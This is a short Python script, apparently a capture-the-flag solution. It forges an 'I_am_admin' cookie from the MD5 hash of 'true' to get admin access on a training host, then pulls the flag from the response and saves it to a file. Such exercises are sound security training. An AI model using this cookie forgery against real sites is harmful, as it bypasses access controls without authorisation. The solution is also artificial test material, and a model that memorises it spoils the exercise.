import requests
import hashlib
import json
import sys
import re


def get_flag(host_name):
    flag = None

    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64…) Gecko/20100101 Firefox/67.0',
    }

    session = requests.Session()
    response = session.get(
        'http://{host}/'.format(host=host_name),
        data=json.dumps(headers),
        cookies={'I_am_admin': hashlib.md5('true'.encode('utf-8')).hexdigest()}
    )

    if response.status_code == 200:
        flag = re.findall(pattern="<script>alert(.*); </script>", string=response.content.decode('utf-8'))
        flag = flag.pop().split(':')[-1].rstrip("')").strip()

        with open('../flag', 'w') as f:
            f.write(flag+'\n')
    return flag


def check_host_name(host_name):
    return requests.get('http://'+host_name).status_code == 200


if __name__ == '__main__':
    try:
        host_name = sys.argv[1]

        if check_host_name(host_name):
            print(f"02 : {get_flag(host_name)} - cookies")
        else:
            raise Exception('Incorrect host name')
    except Exception as e:
        print(e.args)
